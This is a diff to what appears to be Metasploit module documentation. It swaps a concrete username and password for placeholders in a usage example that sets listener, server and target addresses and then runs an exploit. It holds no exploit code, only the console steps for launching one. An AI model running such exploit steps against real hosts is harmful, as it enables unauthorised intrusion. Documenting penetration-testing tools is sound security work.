@@ -42,8 +42,8 @@ This procedure was tested on Kali Linux 22.04 using Metasploit Framework 6.4.2-d
     > set LHOST 1.1.1.1
     > set SRVHOST 1.1.1.1
     > set RHOST 2.2.2.2
-    > set USERNAME tiaan.jerjerrod
-    > set PASSWORD doubleEFFORT!!
+    > set USERNAME <username>
+    > set PASSWORD <password>
     > set target 1
     > exploit
     ```
